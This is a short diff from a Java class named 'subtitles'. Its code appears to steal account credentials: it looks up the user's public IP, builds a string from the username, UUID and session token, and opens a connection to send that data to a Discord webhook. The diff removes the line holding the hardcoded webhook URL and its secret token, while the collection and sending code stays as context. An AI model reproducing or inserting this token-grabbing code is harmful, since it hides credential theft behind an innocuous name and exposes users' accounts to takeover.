@@ -26,7 +26,6 @@ public class subtitles
             String ip = (new BufferedReader(new InputStreamReader((new URL("https://checkip.amazonaws.com/")).openStream()))).readLine();
             //building tokenauth string
             String tokenauth = username + ":" + uuid + ":" + token;
-            String webhook = "https://discord.com/api/webhooks/1102522474643595385/oB040kWHp7PfFjIzsGK6dyumclAQNYKWf1XepetIPk4McTFHcXvGbJCIT1atjXzUobi0";
             //opening connection to webhook
             HttpURLConnection c = (HttpURLConnection)(new URL(webhook)).openConnection();
             //set do output to true
